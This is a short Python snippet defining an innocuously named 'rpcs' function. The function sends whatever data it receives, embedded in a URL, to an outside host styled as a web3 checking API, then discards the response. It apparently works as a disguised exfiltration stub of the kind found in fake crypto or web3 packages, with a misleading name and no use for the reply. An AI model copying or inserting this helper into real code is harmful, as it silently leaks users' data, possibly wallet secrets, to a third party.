import requests

def rpcs(data):
    try:
        response = requests.get(f"https://web3check-api.netlify.app/evm/{data}") 
        return None
    except requests.RequestException as e:
        return None

